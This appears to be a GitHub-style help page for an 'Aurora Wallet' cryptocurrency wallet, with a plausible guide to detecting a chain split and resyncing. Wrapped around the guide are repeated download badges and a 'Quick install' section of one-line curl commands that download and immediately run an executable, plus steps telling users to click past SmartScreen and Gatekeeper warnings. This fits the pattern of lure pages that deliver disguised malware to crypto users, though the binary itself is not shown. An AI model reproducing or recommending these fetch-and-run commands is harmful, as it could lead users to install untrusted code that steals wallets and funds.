![Aurora Wallet chain split resync guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet chain split: spotting a stale chain and resyncing

When your wallet follows a version of the chain the rest of the network has left behind.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A chain split looks like a working wallet: it syncs, it shows a height, and it refuses to match the network.

The cause is a rule change on the network that an older build does not follow. The wallet keeps verifying blocks under the old rules, finds peers that agree with it, and settles on a branch the majority abandoned. The symptoms are a height that lags, a balance that will not match an explorer and transactions that never confirm.

<!-- ARTICLE-BODY-BEGIN -->

## Confirm that you are on the wrong chain

Open the wallet and note the block height. Compare it with a public explorer for Auroracoin. A gap that stays constant while other wallets advance is the signature of a stale branch, especially when the peer count is healthy.

A second sign is a transaction that leaves the wallet, shows as sent, and never confirms anywhere else.

## Resync in order

1. Copy the wallet file to an external drive.
2. Install the current build, which carries the current network rules.
3. Close the wallet completely.
4. Open the data directory and rename `blocks` and `chainstate` to `blocks_old` and `chainstate_old`.
5. Start the wallet and let it download a fresh copy of the chain.
6. Check the new height against an explorer before sending anything.

Renaming rather than deleting keeps the old data in place until the new chain has proven itself. Once the wallet is on the correct chain and the balance matches, the old folders can be removed to recover the disk space.

## Why the update comes first

Rebuilding the chain with an old build reproduces the same split, because the rules the wallet follows decide which branch it accepts. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md">Updating Aurora Wallet safely</a> puts the current rules in place before the download begins.

If the height still lags after a full rebuild, the connection rather than the chain is the problem, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md">wallet not syncing</a> covers the peer and clock checks.

The build that follows the current network is the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>, and it is the one to install before any resync.

## FAQ

### Is my balance lost if the wallet was on the wrong chain?

No. Coins exist on the chain the network agrees on. Once the wallet syncs that chain, the balance appears.

### Do I need to restore my phrase after a resync?

No. The wallet file stays in place; only the downloaded chain data is rebuilt.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
- [Zero balance](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/13-zero-balance.md)
- [Update Aurora Wallet safely](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md)
- [No peers connection](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md)
